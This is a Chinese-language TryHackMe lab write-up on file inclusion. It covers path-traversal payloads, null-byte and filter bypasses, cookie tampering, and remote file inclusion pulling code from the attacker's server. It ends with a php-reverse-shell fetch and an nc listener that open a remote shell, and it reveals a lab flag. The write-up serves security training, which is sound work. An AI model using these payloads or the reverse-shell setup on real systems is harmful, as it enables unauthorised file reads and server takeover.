# task1
```
 http://webapp.thm/get.php?file=userCV.pdf ，其中file是參數，userCV.pdf是訪問所需的文件。
```

### 為什麼會發生文件包含漏洞？
```
漏洞的主要問題是輸入驗證，其中用戶輸入沒有被清理或驗證，並且用戶控制它們。當輸入未被驗證時，用戶可以將任何輸入傳遞給函數，從而導致漏洞
```
### 文件包含的風險是什麼？
```
可以利用文件包含漏洞讀取敏感數據。在這種情況下，成功的攻擊會導致敏感數據洩露，包括與 Web 應用程序相關的代碼和文件、後端系統的憑據
```
```
如果可以通過某種方式寫入服務器的  /tmp目錄等，那麼就有可能獲得遠程命令執行RCE。但是，如果發現文件包含漏洞且無法訪問敏感數據且無法寫入服務器，則該漏洞將無效
```
# task2
no answer needed
# task3
## 路徑遍歷
```
運行應用程序的服務器上的本地文件。攻擊者通過操縱和濫用 Web 應用程序的 URL 來利用此漏洞來定位和訪問存儲在應用程序根目錄之外的文件或目錄。

當用戶的輸入被傳遞給PHP中的 file_get_contents 等函數時，就會發生路徑 遍歷漏洞。需要注意的是，該函數不是漏洞的主要貢獻者。通常糟糕的輸入驗證或過濾是漏洞的原因。 在PHP中，您可以使用 file_get_contents 來讀取文件的內容
```
可以通過添加有效負載來測試 URL 參數，以查看 Web 應用程序的行為。    
路徑遍歷攻擊，利用../將目錄向上移動。    
如果攻擊者找到入口點，在本例中為 get.php?file= ，那麼攻擊者可能會發送如下內容，  http://webapp.thm/get.php?file=../../.. /../etc/passwd
```
假設沒有輸入驗證，並且Web 應用程序沒有訪問位於/var/www/app/CVs位置的 PDF 文件，而是從其他目錄檢索文件，在本例中為/etc/passwd。  

每個..條目移動一個目錄，直到到達根目錄/。然後它將目錄更改為/etc，並從那裡讀取passwd文件
```
### 首先 ../到根目錄

如果是windos:   
如果 Web 應用程序在 Windows 服務器上運行，則攻擊者需要提供 Windows 路徑。例如，如果攻擊者想要讀取位於c:\boot.ini中的boot.ini文件，那麼攻擊者可以根據目標OS版本嘗試以下操作：

http://webapp.thm/get.php?file=../../../../boot.ini 或

http://webapp.thm/get.php?file=../../../../windows/win.ini


```
Q: 什麼函數導致 PHP 中的路徑遍歷漏洞？
A: file_get_contents 
```
# task4
## 本地文件包含 - LFI
```
/lab1.php?file=/etc/passwd
```
# task5
## 本地文件包含 - LFI #2
### 討論幾種繞過包含函數中的過濾器的技術
1.
```
搜尋 http://10.10.68.121/lab3.php?file=../../../../etc/passwd

發現報錯 在我的passwd後面加上了.php
Warning: include(includes/../../../../etc/passwd.php)

所以用空字節，可以將其視為試圖欺騙 Web 應用程序忽略 Null Byte 之後的任何內容。
```
告訴 **include** 函數忽略空字節之後的任何內容，如下所示：    
```
include("languages/../../../../../etc/passwd%00").".php");
```
相當於
```
include("languages/../../../../../etc/passwd");
```
**注意：%00技巧已修復，不適用於PHP 5.3.4及更高版本。**


## lab4
```
http://10.10.61.65/lab4.php?file=../../../etc/passwd/
收到了錯誤: Warning: file_get_contents(../../../etc/passwd/) [function.file-get-contents]: failed to open stream:
```
如果我們嘗試 /etc/passwd/. ， 結果將是 /etc/passwd因為 dot 指的是當前目錄。  
**/.繞過**
```
http://10.10.61.65/lab4.php?file=../../../etc/passwd/.
```

## lab5 繞過過濾器
一樣搜尋../../../etc/passwd後   
```
抱錯:
File Content Preview of ../../../etc/passwd

Warning: include(includes/etc/passwd) [function.include]: failed to open stream: No such file or directory in /var/www/html/lab5.php on line 28

Warning: include() [function.include]: Failed opening 'includes/etc/passwd' for inclusion (include_path='.:/usr/lib/php5.2/lib/php') in /var/www/html/lab5.php on line 28
```

看到web把 **../../../etc/passwd** 換成 **/etc/passwd**  
../../../ 被過濾了
```
....//....//....//....///etc/passwd 這樣繞過
把../過濾成空字符串 就會變成
../../../../etc/passwd
```

## lab6 
提示需要 **Allowed files at THM-profile folder only!**
這樣繞過
```
THM-profile /../../../../../../../etc/passwd
```
# task6
## 遠程文件包含 - RFI  
允許攻擊者將外部 URL 注入到`include`函數中。RFI 的一項要求是`allow_url_fopen`選項需要打開。  
RFI 的風險高於 LFI，因為 RFI 漏洞允許攻擊者在服務器上獲得遠程命令執行 (RCE)。  

**本地**
```
┌─[root@parrot]─[/home/user/RFI]
└──╼ #vim 1.php
┌─[root@parrot]─[/home/user/RFI]
└──╼ #ls
1.php
┌─[root@parrot]─[/home/user/RFI]
└──╼ #cat 1.php
<?PHP echo "Hello THM"; ?>
┌─[root@parrot]─[/home/user/RFI]
└──╼ #python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**目標**
```
http://10.10.61.65/playground.php?file=http://10.9.1.24:8000/1.php

攻擊者註入惡意URL，指向攻擊者的服務器，如 http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. 如果沒有輸入驗證，則惡意 URL 將傳遞到包含函數。接下來，Web 應用服務器將向惡意服務器發送GET請求以獲取文件。因此，Web 應用程序將遠程文件包含在 include 函數中，以執行頁面內的 PHP 文件並將執行內容髮送給攻擊者。在我們的例子中，當前頁面某處必須顯示Hello THM消息。
```


# task7
```
作為開發人員，了解 Web 應用程序漏洞、如何找到它們以及預防方法非常重要。為了防止文件包含漏洞，一些常見的建議包括：


1.使用最新版本更新系統和服務，包括 Web 應用程序框架。
2.關閉 PHP 錯誤以避免洩露應用程序的路徑和其他可能洩露的信息。
3.Web 應用程序防火牆 (WAF) 是幫助緩解 Web 應用程序攻擊的好選擇。
4.如果您的 Web 應用程序不需要某些導致文件包含漏洞的 PHP 功能，請禁 
用它們，例如allow_url_fopen on 和allow_url_include。
5.仔細分析 Web 應用程序，只允許需要的協議和 PHP 包裝器。
6.永遠不要相信用戶輸入，並確保針對文件包含實施正確的輸入驗證。
7.對文件名和位置實施白名單以及黑名單
```
# task8
### 1
```
打開bp抓包 ../../../flag1 
然後把請求改成post
```
### 2
```
進去後 看到
Welcome Guest!
Only admins can access this page!
必須是admin
 
抓包發現 Cookie: THM=Guest  所以把Guest改成admin

後來改成amdins報錯
Warning: include(includes/admins.php)

Cookie: THM=admins/../../../../../../../etc/flag2

Warning</b>:  include(includes/admins/../../../../../../../etc/flag2.php)
發現在後面被加上了.php 所以用%00繞過

Cookie: THM=admins/../../../../../../../etc/flag2%00
```
### 3 
```
用 ../../../../etc/flag3
發現 Warning: include(etcflag.php)

....//....//....//....// 也是一樣過濾

把請求從get改成post

../../../../etc/flag3%00

P0st_1s_w0rk1in9

```

### 4
```
http://10.9.1.24:8000/php-reverse-shell.php 

然後本地nc -nvlp 4444

hostname:lfi-vm-thm-f8c5b1a78692
```



